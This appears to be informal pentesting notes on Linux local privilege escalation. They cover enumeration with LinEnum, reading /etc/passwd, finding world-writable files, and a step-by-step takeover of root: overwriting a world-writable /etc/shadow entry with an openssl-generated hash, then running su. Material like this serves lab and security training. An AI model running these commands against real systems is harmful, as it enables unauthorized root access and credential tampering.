Use LinEnum to find potential vulnerabilities, we will show the stage after this.
Linenum is a simple bash script that automates common linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.

cat /etc/passwd (shows other user accounts)
cat /etc/groups (shows groups, mainly service accounts)
groups <user> (to see what groups the user is part of)

find / -not -type l -perm -o+w (find files that can be modified by every user account)

**/etc is the best directory such as /etc/shadow**
**/etc also contains user creds... so this would be great**

ls -al /etc/shadow (-rw-rw-rw means global permissions)

**we can generate a password to replace the root account password, but since shadow is hashed, we must replace it with our hashed password**

openssl passwd -1 -salt abc password (copy the password 'password')
vim /etc/shadow (replace the password for root. root:<password>:)
su
<password prompt>
**root access granted**

In most cases you will not find global permissions to the /etc/shadow file, it will most likely be to another file that we can use to elevate our permissions.
